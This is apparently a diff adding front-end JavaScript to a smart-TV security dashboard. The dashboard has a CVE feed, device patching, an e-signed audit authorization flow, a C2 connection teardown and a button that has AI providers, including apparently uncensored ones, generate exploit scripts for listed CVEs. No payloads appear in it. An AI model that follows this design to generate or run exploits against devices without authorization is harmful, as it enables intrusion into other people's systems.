+  const ip = target ? target.ip : prompt(`No scanned ${tvType} device found. Enter target IP to patch ${cveId}:`);
+  if (!ip) return;
+  addLog(`Patching ${cveId} on ${ip} (${tvType})...`);
+  try {
+    const res = await api('/api/cve/patch', 'POST', { ip, tv_type: tvType });
+    const ok = (res.patches || []).filter(p => p.status === 'ok' || p.status === 'executed').length;
+    addLog(`Patch on ${ip}: ${ok}/${res.total} commands ok — CVEs fixed: ${(res.cves_fixed || []).join(', ')}`);
+  } catch (e) {
+    addLog(`Patch failed: ${e}`);
+  }
+}
+
+async function patchScanTarget(ip, tvType) {
+  // Results land in the panel directly under the table (renderScanResults
+  // recreates it, so a later scan clears it). Writing to setScanStatus() would
+  // erase the whole results table — it targets #scan-results too.
+  const slot = document.getElementById('scan-action-status');
+  const say = (html) => { if (slot) slot.innerHTML = html; };
+
+  if (!tvType) {
+    const msg = `No CVE profile for ${ip} — nothing to patch`;
+    addLog(msg);
+    say('<div class="alert alert-warning" style="margin-top:12px">'
+      + escapeHtml(msg) + '. Only a family match can be remediated — press '
+      + '<strong>Check</strong> on that row first.</div>');
+    return;
+  }
+  addLog(`Patching ${ip} (${tvType}) — executing remediation commands...`);
+  say('<p style="color:var(--text-muted);font-size:13px;padding:10px 0">Patching '
+    + escapeHtml(ip) + ' (' + escapeHtml(tvType) + ') — running remediation '
+    + 'commands…</p>');
+  try {
+    const res = await api('/api/cve/patch', 'POST', { ip, tv_type: tvType });
+    if (res && res.error) throw new Error((res.errors || [res.error]).join(' '));
+    const patches = Array.isArray(res.patches) ? res.patches : [];
+    const ok = patches.filter(p => p.status === 'ok' || p.status === 'executed').length;
+    const fixed = Array.isArray(res.cves_fixed) ? res.cves_fixed : [];
+    addLog(`Patch on ${ip}: ${ok}/${res.total} commands ok — fixed ${fixed.join(', ')}`);
+    say('<div class="alert alert-success" style="margin-top:12px">Patched '
+      + escapeHtml(ip) + ': ' + ok + '/' + (res.total !== undefined ? res.total : patches.length)
+      + ' commands ok — fixed ' + escapeHtml(fixed.join(', ') || 'no CVE list returned')
+      + '.</div>');
+  } catch (e) {
+    const msg = (e && e.message) || String(e);
+    addLog(`Patch failed on ${ip}: ${msg}`);
+    say('<div class="alert alert-warning" style="margin-top:12px">Patch failed on '
+      + escapeHtml(ip) + ': ' + escapeHtml(msg) + '</div>');
+  }
+}
+
+// --- CVE Feed sidebar ---
+async function loadFeed(silent) {
+  try {
+    feedData = await api('/api/cve/feed');
+    renderFeed();
+    if (!silent && feedData.last_result) addLog(`Feed: ${feedData.last_result}`);
+    return feedData;
+  } catch (e) {
+    if (!silent) addLog(`Feed load failed: ${e}`);
+    return null;
+  }
+}
+
+function renderFeed() {
+  const el = document.getElementById('feed-list');
+  if (!feedData || !feedData.cves || feedData.cves.length === 0) {
+    el.innerHTML = '<p style="color:var(--text-muted);font-size:12px;padding:8px">No CVEs yet. Click "Update CVEs" on the CVE Monitor tab.</p>';
+    document.getElementById('feed-count').textContent = '0 CVEs';
+    return;
+  }
+  const sevBadge = s => {
+    const cls = s === 'CRITICAL' ? 'badge-danger' : s === 'HIGH' ? 'badge-warning' : 'badge-success';
+    return `<span class="badge ${cls}">${s || 'UNKNOWN'}</span>`;
+  };
+  el.innerHTML = feedData.cves.slice(0, 50).map(c => `
+    <div class="feed-item">
+      <div class="feed-item-head">
+        <a class="feed-item-id" href="${c.nvd_url || 'https://nvd.nist.gov'}" target="_blank" title="Open NVD advisory">${c.id} &#8599;</a>
+        ${sevBadge(c.severity)}
+      </div>
+      <div class="feed-item-desc">${(c.description || 'No description.').replace(/</g, '&lt;')}</div>
+      <div class="feed-item-links">
+        <a href="${c.nvd_url || '#'}" target="_blank">NVD Advisory</a>
+        <a href="${c.whitepaper_url || '/api/cve/whitepaper/' + c.id}" target="_blank">Whitepaper</a>
+        ${c.exploit_generated ? '<span class="cve-chip" style="font-size:9px">&#9889; exploit ready</span>' : ''}
+      </div>
+      <div class="feed-item-actions">
+        <button class="btn" onclick="viewWhitepaper('${c.id}')"
+          title="Render this CVE's whitepaper in the Output panel">View Whitepaper</button>
+        <button class="btn" onclick="viewVulnInfo('${c.id}')"
+          title="Render vulnerability details in the Output panel">View Vulnerability Info</button>
+      </div>
+    </div>
+  `).join('');
+  document.getElementById('feed-count').textContent = `${feedData.count} CVEs`;
+  const updated = feedData.last_update ? new Date(feedData.last_update).toLocaleString() : '—';
+  document.getElementById('feed-updated').textContent =
+    (feedData.updating ? 'Updating… · ' : '') + updated;
+}
+
+// --- Output panel (T-01): single replaceable viewer ------------------------
+function escapeHtml(s) {
+  return String(s == null ? '' : s)
+    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+}
+// For values interpolated into an inline `onclick="…'…'"` handler.
+// escapeHtml() deliberately leaves apostrophes alone (they need no escaping in
+// HTML text), but inside a single-quoted JS string one splits the argument
+// list and the handler dies with a SyntaxError — a button that does nothing.
+// Escape the JS string first, then the HTML attribute: the other order lets
+// &#39; decode back to ' before the script is parsed.
+function jsAttr(s) {
+  return String(s == null ? '' : s)
+    .replace(/\\/g, '\\\\').replace(/'/g, "\\'")
+    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;');
+}
+function inlineMd(s) {
+  return s
+    .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
+    .replace(/`([^`]+)`/g, '<code>$1</code>')
+    .replace(/\[([^\]]+)\]\((https?:\/\/[^)\s]+)\)/g,
+             '<a href="$2" target="_blank" rel="noopener">$1</a>');
+}
+function mdToHtml(md) {
+  const out = []; let buf = []; let inList = false; let inCode = false;
+  const flush = () => {
+    if (buf.length) { out.push('<p>' + inlineMd(escapeHtml(buf.join(' '))) + '</p>'); buf = []; }
+  };
+  for (const raw of String(md || '').split('\n')) {
+    const line = raw.replace(/\s+$/, '');
+    if (inCode) {
+      if (line.startsWith('```')) { out.push('</code></pre>'); inCode = false; }
+      else out.push(escapeHtml(raw));
+      continue;
+    }
+    if (line.startsWith('```')) {
+      flush(); if (inList) { out.push('</ul>'); inList = false; }
+      out.push('<pre><code>'); inCode = true; continue;
+    }
+    const li = line.match(/^\s*[-*]\s+(.*)$/);
+    if (li) {
+      flush(); if (!inList) { out.push('<ul>'); inList = true; }
+      out.push('<li>' + inlineMd(escapeHtml(li[1])) + '</li>'); continue;
+    }
+    if (inList) { out.push('</ul>'); inList = false; }
+    const h = line.match(/^(#{1,4})\s+(.*)$/);
+    if (h) {
+      flush(); const lvl = h[1].length;
+      out.push('<h' + lvl + '>' + inlineMd(escapeHtml(h[2])) + '</h' + lvl + '>'); continue;
+    }
+    if (!line.trim()) flush(); else buf.push(line);
+  }
+  flush();
+  if (inList) out.push('</ul>');
+  if (inCode) out.push('</code></pre>');
+  return out.join('\n');
+}
+function setOutput(title, metaHtml, bodyHtml) {
+  const body = document.getElementById('output-body');
+  body.innerHTML = '<div class="output-title">' + title + '</div>' +
+    (metaHtml ? '<div class="output-meta">' + metaHtml + '</div>' : '') + bodyHtml;
+  body.scrollTop = 0;
+}
+function resetOutput() {
+  document.getElementById('output-body').innerHTML =
+    '<p class="output-empty">Nothing selected yet. Use <b>View Whitepaper</b> or ' +
+    '<b>View Vulnerability Info</b> on any CVE in the feed &#8594;</p>';
+}
+async function viewWhitepaper(id) {
+  setOutput(escapeHtml(id) + ' — Whitepaper', '',
+            '<p class="output-empty">Fetching whitepaper…</p>');
+  try {
+    const doc = await api('/api/cve/whitepaper_doc/' + encodeURIComponent(id));
+    if (doc.error) throw new Error(doc.error);
+    const meta = (doc.generated
+        ? 'Generated whitepaper &middot; docs/whitepapers/' + escapeHtml(id) + '.md'
+        : 'Template whitepaper &middot; generated on demand') +
+      ' &middot; <a href="/api/cve/whitepaper/' + encodeURIComponent(id) +
+      '" target="_blank">Open full page &#8599;</a>';
+    setOutput(escapeHtml(id) + ' — Whitepaper', meta, mdToHtml(doc.markdown));
+  } catch (e) {
+    setOutput(escapeHtml(id) + ' — Whitepaper', '',
+              '<p class="output-empty">Could not load whitepaper: ' +
+              escapeHtml(e.message || e) + '</p>');
+  }
+}
+function viewVulnInfo(id) {
+  const c = ((feedData && feedData.cves) || []).find(x => x.id === id);
+  if (!c) {
+    setOutput(escapeHtml(id) + ' — Vulnerability info', '',
+              '<p class="output-empty">CVE not in the loaded feed — run ' +
+              '"Update CVEs" first.</p>');
+    return;
+  }
+  const rows = [
+    ['Severity', c.severity || 'UNKNOWN'],
+    ['CVSS score', (c.score != null && c.score !== '') ? c.score : 'n/a'],
+    ['CWE', (c.cwe && c.cwe.length) ? c.cwe.join(', ') : 'n/a'],
+    ['Component', c.component || 'unknown'],
+    ['Fixed in', c.fixed_in || 'see vendor advisory'],
+    ['Attack vector', c.exploitability || c.attack_vector || 'unknown'],
+    ['Published', c.published || 'unknown'],
+    ['Exploit module', c.exploit_generated ? 'generated ✓' : 'not generated'],
+  ];
+  let html = '<p>' + escapeHtml(c.description || 'No description.') + '</p>' +
+    '<table>' + rows.map(r =>
+      '<tr><th style="width:38%">' + escapeHtml(r[0]) + '</th><td>' +
+      escapeHtml(r[1]) + '</td></tr>').join('') + '</table>';
+  if (c.affected && c.affected.length) {
+    html += '<h2>Affected products</h2><ul>' + c.affected.map(a =>
+      '<li><code>' + escapeHtml(a) + '</code></li>').join('') + '</ul>';
+  }
+  html += '<div id="artifact-status"><p class="output-empty">Loading artifact status…</p></div>';
+  const meta =
+    '<a href="' + escapeHtml(c.nvd_url || '#') + '" target="_blank">NVD advisory &#8599;</a>' +
+    ' &middot; <a href="' +
+    escapeHtml(c.whitepaper_url || '/api/cve/whitepaper/' + c.id) +
+    '" target="_blank">Whitepaper &#8599;</a>';
+  setOutput(escapeHtml(id) + ' — Vulnerability info', meta, html);
+  loadArtifactStatus(id);
+}
+async function loadArtifactStatus(id) {
+  try {
+    const a = await api('/api/cve/artifacts/' + encodeURIComponent(id));
+    const el = document.getElementById('artifact-status');
+    if (!el || !a.flags) return;
+    const mark = v => v ? '&#10003;' : '&#8212;';
+    el.innerHTML =
+      '<h2>Artifacts (T-02)</h2><p>whitepaper ' + mark(a.flags.whitepaper_generated) +
+      ' &middot; test ' + mark(a.flags.tests_generated) +
+      ' &middot; signature ' + mark(a.flags.signature_generated) +
+      ' &middot; patch-check ' + mark(a.flags.patch_check_generated) +
+      (a.exploit_generated ? ' &middot; exploit &#9889;' : '') + '</p>' +
+      '<p class="output-meta">' + Object.entries(a.files || {}).map(([k, f]) =>
+        (f.exists ? '&#9679; ' : '&#9675; ') + escapeHtml(f.path)).join(' &middot; ') + '</p>';
+  } catch (e) { /* panel is already rendered */ }
+}
+
+// --- AI provider keys ---
+async function loadAiKeys() {
+  try {
+    aiStatus = await api('/api/ai-keys');
+    const el = document.getElementById('ai-key-status');
+    if (!el) return;
+    el.innerHTML = Object.entries(aiStatus).map(([pid, p]) => `
+      <div class="info-item">
+        <span class="label">${p.name}</span>
+        <span class="value" style="color:${p.configured ? 'var(--success)' : 'var(--text-muted)'}">
+          ${p.configured ? 'Set ' + p.masked : 'Not set'}
+        </span>
+      </div>
+    `).join('');
+  } catch (e) { /* non-fatal */ }
+}
+
+async function saveAiKeys() {
+  const keys = {};
+  ['openrouter', 'venice', 'abliteration', 'local'].forEach(pid => {
+    const v = (document.getElementById('key-' + pid).value || '').trim();
+    if (v) keys[pid] = v;
+  });
+  if (Object.keys(keys).length === 0) {
+    addLog('No keys entered — nothing saved');
+    return;
+  }
+  await api('/api/ai-keys', 'POST', keys);
+  ['openrouter', 'venice', 'abliteration', 'local'].forEach(pid => {
+    document.getElementById('key-' + pid).value = '';
+  });
+  addLog(`AI keys saved for: ${Object.keys(keys).join(', ')}`);
+  await loadAiKeys();
+  if (feedData) await loadFeed(true);
+}
+
+async function testAiGeneration() {
+  if (!feedData || !feedData.cves || feedData.cves.length === 0) {
+    addLog('Feed is empty — run "Update CVEs" first');
+    return;
+  }
+  const target = feedData.cves[0];
+  const model = (document.getElementById('venice-model') || {}).value || null;
+  addLog(`Test-generating exploit for ${target.id}...`);
+  try {
+    const res = await api('/api/cve/generate', 'POST', {
+      cve_id: target.id,
+      provider: null,
+      model: (aiStatus.venice && aiStatus.venice.configured) ? model : null,
+    });
+    if (res.error) { addLog(`Generation failed: ${res.error}`); return; }
+    addLog(`Exploit generated for ${target.id} (${res.provider}) — saved to data/exploits/generated/${target.id}.py`);
+    document.getElementById('payload-text').textContent = res.code;
+    document.querySelector('#payload-modal .modal-title').textContent = `Generated Exploit — ${target.id}`;
+    document.getElementById('payload-modal').classList.add('active');
+    await loadFeed(true);
+  } catch (e) {
+    addLog(`Generation failed: ${e}`);
+  }
+}
+
+// Server Info — real host facts from /api/host_info (nothing simulated)
+async function loadServerInfo() {
+  try {
+    const info = await api('/api/host_info');
+    if (info.error) throw new Error(info.error);
+    const set = (id, v) => {
+      const el = document.getElementById(id);
+      if (el) el.textContent = (v === null || v === undefined || v === '') ? '—' : v;
+    };
+    set('srv-ipv4', info.local_ip);
+    set('srv-ipv6', info.ipv6);
+    set('srv-mac', info.mac);
+    set('srv-hostname', info.hostname);
+    set('srv-os', info.os);
+    set('srv-python', 'Python ' + info.python);
+    set('srv-port', info.c2_port);
+    const started = info.started_at
+      ? new Date(info.started_at.includes('Z') ? info.started_at : info.started_at + 'Z')
+      : null;
+    set('srv-started', started ? started.toLocaleString() : '—');
+    const up = info.uptime_s || 0;
+    const h = Math.floor(up / 3600), m = Math.floor((up % 3600) / 60), s = up % 60;
+    set('srv-uptime', h ? `${h}h ${m}m` : (m ? `${m}m ${s}s` : `${s}s`));
+  } catch (e) {
+    const el = document.getElementById('srv-ipv4');
+    if (el && !el.textContent.trim()) el.textContent = 'unavailable';
+  }
+}
+
+// Real teardown — closes tracked sockets + exploit tools, verifies state
+async function killAllConnections() {
+  addLog('Killing all C2 connections (tracked sockets + exploit tools)...');
+  try {
+    const res = await api('/api/connections/kill', 'POST', {});
+    if (res.error) throw new Error(res.error);
+    const r = res.result || {};
+    addLog(`Teardown: ${r.sockets_closed || 0} socket(s) closed, `
+      + `${(r.tools_terminated || []).length} tool(s) terminated — ${r.detail || 'done'}`);
+  } catch (e) {
+    addLog(`Teardown failed: ${e.message || e}`);
+  }
+}
+
+// ===== Engagement flow (Audit button / Patch-all button) ==================
+const ENG_ACTIVE = ['created', 'scanning', 'checking', 'exploiting',
+                    'tearing_down', 'patching', 'rendering'];
+const PHASE_TITLES = {
+  idle: 'Idle', created: 'Starting…', scanning: 'Scanning network',
+  checking: 'Verifying exploits (dry-run, no payloads)',
+  exploiting: 'Sending exploits', tearing_down: 'Killing connections',
+  rendering: 'Generating report', patching: 'Patching devices',
+  awaiting_client: 'Client details required', done: 'Complete', error: 'Error',
+};
+
+function rememberClient(client) {
+  try { localStorage.setItem('spytv_client', JSON.stringify(client)); } catch (e) {}
+}
+function rememberedClient() {
+  try { return JSON.parse(localStorage.getItem('spytv_client') || 'null'); } catch (e) { return null; }
+}
+
+// -- Client details modal --------------------------------------------------
+function openClientModal(mode) {
+  clientModalMode = mode;
+  const errs = document.getElementById('client-errors');
+  errs.hidden = true;
+  errs.innerHTML = '';
+  document.getElementById('client-modal-title').textContent =
+    mode === 'audit' ? 'Client Details — Authorization' : 'Client Details — Remediation Report';
+  document.getElementById('client-modal-sub').textContent = mode === 'audit'
+    ? 'These details appear on the authorization form you will e-sign, and on the final audit report.'
+    : 'Patching is complete — these details appear on the remediation report (PDF).';
+  document.getElementById('client-submit').textContent =
+    mode === 'audit' ? 'Create Authorization Form' : 'Generate Report';
+  const saved = rememberedClient();
+  ['company', 'name', 'address', 'phone', 'email', 'website'].forEach(f => {
+    document.getElementById('cf-' + f).value = (saved && saved[f]) ? saved[f] : '';
+  });
+  document.getElementById('client-modal').classList.add('active');
+  setTimeout(() => document.getElementById('cf-company').focus(), 50);
+}
+
+function closeClientModal() {
+  document.getElementById('client-modal').classList.remove('active');
+}
+
+function readClientForm() {
+  return {
+    company: document.getElementById('cf-company').value.trim(),
+    name: document.getElementById('cf-name').value.trim(),
+    address: document.getElementById('cf-address').value.trim(),
+    phone: document.getElementById('cf-phone').value.trim(),
+    email: document.getElementById('cf-email').value.trim(),
+    website: document.getElementById('cf-website').value.trim(),
+  };
+}
+
+function showClientErrors(errors) {
+  const el = document.getElementById('client-errors');
+  el.hidden = false;
+  el.innerHTML = errors.map(e => `<div>&bull; ${e}</div>`).join('');
+}
+
+async function submitClientForm() {
+  const client = readClientForm();
+  const btn = document.getElementById('client-submit');
+  const label = btn.textContent;
+  btn.disabled = true;
+  btn.textContent = 'Submitting...';
+  try {
+    if (clientModalMode === 'audit') {
+      const res = await api('/api/audit/authorize', 'POST', { client });
+      if (res.error) { showClientErrors(res.errors || [res.error]); return; }
+      rememberClient(client);
+      closeClientModal();
+      addLog(`Authorization ${res.auth_id} created (expires in ${res.expires_days} days) — review and sign to start the audit`);
+      openAuthModal(res, client);
+    } else {
+      const res = await api('/api/patch/report', 'POST', { client });
+      if (res.error) { showClientErrors(res.errors || [res.error]); return; }
+      rememberClient(client);
+      closeClientModal();
+      addLog(`Remediation report ${res.report_id} rendered — use the Report button to download it`);
+      await refreshEngagement('patch');
+    }
+  } catch (e) {
+    showClientErrors([e.message || String(e)]);
+  } finally {
+    btn.disabled = false;
+    btn.textContent = label;
+  }
+}
+
+// -- Authorization e-sign modal -------------------------------------------
+function openAuthModal(res, client) {
+  currentAuth = { auth_id: res.auth_id, pdf_url: res.pdf_url };
+  const errs = document.getElementById('auth-errors');
+  errs.hidden = true;
+  errs.textContent = '';
+  document.getElementById('auth-company').value = (client && client.company) || '';
+  document.getElementById('auth-rep').textContent = (client && client.name) || '—';
+  const btn = document.getElementById('auth-sign-btn');
+  btn.disabled = false;
+  btn.textContent = 'Sign & Start Audit';
+  document.getElementById('auth-frame').src = res.pdf_url + '&v=' + Date.now();
+  document.getElementById('auth-modal').classList.add('active');
+  setTimeout(initSignaturePad, 80); // wait for layout before sizing the canvas
+}
+
+function closeAuthModal() {
+  document.getElementById('auth-modal').classList.remove('active');
+  document.getElementById('auth-frame').src = 'about:blank';
+}
+
+function initSignaturePad() {
+  sigCanvas = document.getElementById('sig-canvas');
+  const rect = sigCanvas.getBoundingClientRect();
+  if (!rect.width) return;
+  const dpr = window.devicePixelRatio || 1;
+  sigCanvas.width = Math.round(rect.width * dpr);
+  sigCanvas.height = Math.round(rect.height * dpr);
+  sigCtx = sigCanvas.getContext('2d');
+  sigCtx.scale(dpr, dpr);
+  sigCtx.lineWidth = 2.2;
+  sigCtx.lineCap = 'round';
+  sigCtx.lineJoin = 'round';
+  sigCtx.strokeStyle = '#111827'; // dark ink for the printed instrument
+  sigInk = false;
+  document.getElementById('sig-hint').textContent = 'Draw your signature above.';
+}
+
+function clearSignature() {
+  if (sigCtx && sigCanvas) sigCtx.clearRect(0, 0, sigCanvas.width, sigCanvas.height);
+  sigInk = false;
+  document.getElementById('sig-hint').textContent = 'Signature cleared — draw again.';
+}
+
+// Bind the signature pad once (uses the current context after each open).
+(function bindSignaturePad() {
+  const c = document.getElementById('sig-canvas');
+  if (!c) return;
+  let drawing = false;
+  const at = e => {
+    const r = c.getBoundingClientRect();
+    return { x: e.clientX - r.left, y: e.clientY - r.top };
+  };
+  c.addEventListener('pointerdown', e => {
+    if (!sigCtx) return;
+    e.preventDefault();
+    drawing = true;
+    sigInk = true;
+    try { c.setPointerCapture(e.pointerId); } catch (err) {}
+    const p = at(e);
+    sigCtx.beginPath();
+    sigCtx.moveTo(p.x, p.y);
+    sigCtx.lineTo(p.x + 0.1, p.y + 0.1);
+    sigCtx.stroke();
+    document.getElementById('sig-hint').textContent = 'Signature captured — press “Sign & Start Audit”.';
+  });
+  c.addEventListener('pointermove', e => {
+    if (!drawing || !sigCtx) return;
+    e.preventDefault();
+    const p = at(e);
+    sigCtx.lineTo(p.x, p.y);
+    sigCtx.stroke();
+  });
+  const stop = () => { drawing = false; };
+  c.addEventListener('pointerup', stop);
+  c.addEventListener('pointercancel', stop);
+})();
+
+async function signAndStart() {
+  if (!currentAuth) return;
+  const errs = document.getElementById('auth-errors');
+  errs.hidden = true;
+  if (!sigInk || !sigCanvas) {
+    errs.hidden = false;
+    errs.textContent = 'Please draw your signature before signing.';
+    return;
+  }
+  const company = document.getElementById('auth-company').value.trim();
+  if (!company) {
+    errs.hidden = false;
+    errs.textContent = 'Client company name is required to execute the authorization.';
+    return;
+  }
+  const btn = document.getElementById('auth-sign-btn');
+  btn.disabled = true;
+  btn.textContent = 'Signing…';
+  try {
+    const signature = sigCanvas.toDataURL('image/png');
+    const res = await api('/api/audit/sign', 'POST', {
+      auth_id: currentAuth.auth_id,
+      signature,
+      signer_company: company,
+    });
+    if (res.error) throw new Error((res.errors || [res.error]).join(' '));
+    lastAuthId = res.auth_id;
+    try { localStorage.setItem('spytv_auth', res.auth_id); } catch (e) {}
+    closeAuthModal();
+    addLog(`Authorization signed (${res.auth_id}, record hash ${String(res.record_hash).slice(0, 12)}…) — audit started: ${res.report_id}`);
+    showBanner('audit', {
+      phase: 'created', progress: 0, report_id: res.report_id,
+      log: [{ at: null, msg: 'Engagement started — authorization executed.' }],
+    });
+    startEngPoll('audit');
+  } catch (e) {
+    errs.hidden = false;
+    errs.textContent = e.message || String(e);
+  } finally {
+    btn.disabled = false;
+    btn.textContent = 'Sign & Start Audit';
+  }
+}
+
+// -- Entry points ----------------------------------------------------------
+async function startAudit() {
+  try {
+    const st = await api('/api/audit/status');
+    if (ENG_ACTIVE.includes(st.phase) || st.phase === 'awaiting_client') {
+      addLog(`An audit engagement is already active (${st.phase})`);
+      showBanner('audit', st);
+      startEngPoll('audit');
+      return;
+    }
+  } catch (e) { /* server hiccup — fall through to the form */ }
+  openClientModal('audit');
+}
+
+async function startPatchAll() {
+  try {
+    const st = await api('/api/patch/status');
+    if (ENG_ACTIVE.includes(st.phase)) {
+      addLog(`A patch engagement is already running (${st.phase})`);
+      showBanner('patch', st);
+      startEngPoll('patch');
+      return;
+    }
+    if (st.phase === 'awaiting_client') {
+      // Patching finished earlier — go straight to the client-details step.
+      patchPrompted = false;
+      showBanner('patch', st);
+      startEngPoll('patch');
+      return;
+    }
+    const res = await api('/api/patch/start', 'POST', {});
+    if (res.error) { addLog(`Patch-all failed to start: ${res.error}`); return; }
+    patchPrompted = false;
+    addLog(`Patch-all started (${res.report_id}) — remediating every device…`);
+    showBanner('patch', {
+      phase: 'created', progress: 0, report_id: res.report_id,
+      log: [{ at: null, msg: 'Patch-all started — discovering devices…' }],
+    });
+    startEngPoll('patch');
+  } catch (e) {
+    addLog(`Patch-all failed: ${e.message || e}`);
+  }
+}
+
+// -- Status banner + polling ----------------------------------------------
+function showBanner(kind, s) {
+  document.getElementById('engagement-status').hidden = false;
+  renderBanner(kind, s);
+}
+
+function renderBanner(kind, s) {
+  const phase = s.phase || 'idle';
+  const title = PHASE_TITLES[phase] || phase;
+  const log = s.log || [];
+  const lastMsg = log.length ? log[log.length - 1].msg : '';
+  document.getElementById('eng-title').textContent =
+    `${kind === 'audit' ? 'Audit' : 'Patch-all'} — ${title}`;
+  document.getElementById('eng-msg').textContent =
+    s.error ? `Error: ${s.error}` : (lastMsg || title);
+  const pct = typeof s.progress === 'number' ? s.progress : 0;
+  document.getElementById('eng-pct').textContent = pct + '%';
+  const bar = document.getElementById('eng-bar');
+  bar.style.width = pct + '%';
+  bar.classList.remove('ok', 'err');
+  const dot = document.getElementById('eng-dot');
+  dot.classList.remove('ok', 'err', 'warn');
+  if (phase === 'done') { bar.classList.add('ok'); dot.classList.add('ok'); }
+  else if (phase === 'error') { bar.classList.add('err'); dot.classList.add('err'); }
+  else if (phase === 'awaiting_client') { dot.classList.add('warn'); }
+  const done = phase === 'done' && s.report_ready;
+  document.getElementById('eng-report-btn').hidden = !done;
+  document.getElementById('eng-auth-btn').hidden = !(done && kind === 'audit');
+  document.getElementById('eng-close-btn').hidden =
+    !(phase === 'done' || phase === 'error');
+}
+
+function startEngPoll(kind) {
+  engKind = kind;
+  if (engPollTimer) clearInterval(engPollTimer);
+  engPollTimer = setInterval(() => refreshEngagement(kind), 2000);
+  refreshEngagement(kind);
+}
+
+function stopEngPoll() {
+  if (engPollTimer) clearInterval(engPollTimer);
+  engPollTimer = null;
+}
+
+async function refreshEngagement(kind) {
+  let s;
+  try {
+    s = await api(`/api/${kind}/status`);
+  } catch (e) {
+    return; // transient — keep polling
+  }
+  if (s.phase === 'idle') {
+    if (engKind === kind) { stopEngPoll(); dismissEngagement(); }
+    return;
+  }
+  renderBanner(kind, s);
+  document.getElementById('engagement-status').hidden = false;
+
+  const active = ENG_ACTIVE.includes(s.phase) || s.phase === 'awaiting_client';
+  if (!active) stopEngPoll();
+
+  if (s.phase === 'error') {
+    addLog(`${kind === 'audit' ? 'Audit' : 'Patch-all'} failed: ${s.error || 'unknown error'}`);
+  }
+  if (s.phase === 'awaiting_client' && kind === 'patch' && !patchPrompted) {
+    patchPrompted = true;
+    addLog('Patch-all finished — enter client details to render the remediation report');
+    openClientModal('patch');
+  }
+  if (s.phase === 'done') {
+    addLog(s.report_ready
+      ? `${kind === 'audit' ? 'Audit' : 'Remediation'} report ${s.report_id} ready — download it from the banner`
+      : `${kind} engagement finished`);
+  }
+}
+
+function dismissEngagement() {
+  document.getElementById('engagement-status').hidden = true;
+}
+
+function openEngagementReport() {
+  window.open(`/api/${engKind || 'audit'}/report.pdf`, '_blank', 'noopener');
+}
+
+function openEngagementAuthorization() {
+  let id = lastAuthId;
+  try { id = id || localStorage.getItem('spytv_auth'); } catch (e) {}
+  if (!id) { addLog('No authorization record on file'); return; }
+  window.open(`/api/audit/authorization.pdf?auth_id=${encodeURIComponent(id)}&state=signed`,
+              '_blank', 'noopener');
+}
+
+async function restoreEngagement() {
+  // After a page reload the server still owns engagement state — re-attach.
+  try {
+    const audit = await api('/api/audit/status');
+    if (audit.phase && audit.phase !== 'idle') {
+      showBanner('audit', audit);
+      if (ENG_ACTIVE.includes(audit.phase)) { startEngPoll('audit'); return; }
+      if (audit.phase === 'done' || audit.phase === 'error') { engKind = 'audit'; return; }
+    }
+  } catch (e) { /* ignore */ }
+  try {
+    const patch = await api('/api/patch/status');
+    if (patch.phase && patch.phase !== 'idle') {
+      showBanner('patch', patch);
+      if (ENG_ACTIVE.includes(patch.phase) || patch.phase === 'awaiting_client') {
+        startEngPoll('patch');
+      } else {
+        engKind = 'patch';
+      }
+    }
+  } catch (e) { /* ignore */ }
+}
+
+// Poll for updates
+async function poll() {
+  await loadDevices();
+  await loadClips();
+  await loadLocalIp();
+  await loadServerInfo();
+  setTimeout(poll, 3000);
+}
+
+// One-time initialization: CVE feed sidebar, CVE database, AI key status.
+(async function init() {
+  resetOutput();              // panel resets on every C2/dashboard start
+  await loadCveDb();
+  await loadFeed(true);
+  await loadAiKeys();
+  await loadCVEs();
+  restoreEngagement();          // re-attach to a running/past engagement
+  // Refresh the feed every 60s to pick up startup/other-client updates.
+  setInterval(() => loadFeed(true), 60000);
+})();
+
+// Keyboard support: Escape closes dialogs, Enter/Space activates nav tabs.
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') {
+    document.querySelectorAll('.modal-overlay.active').forEach(el => {
+      if (el.id === 'auth-modal') closeAuthModal();
+      else el.classList.remove('active');
+    });
+  }
+  if ((e.key === 'Enter' || e.key === ' ') && e.target.classList
+      && e.target.classList.contains('nav-item')) {
+    e.preventDefault();
+    e.target.click();
+  }
+});
+
+// Clicking a modal backdrop (not its dialog) dismisses it.
+document.querySelectorAll('.modal-overlay').forEach(overlay => {
+  overlay.addEventListener('click', e => {
+    if (e.target !== overlay) return;
+    if (overlay.id === 'auth-modal') closeAuthModal();
+    else overlay.classList.remove('active');
+  });
+});
+
+poll();
+</script>
 </body>
 </html>
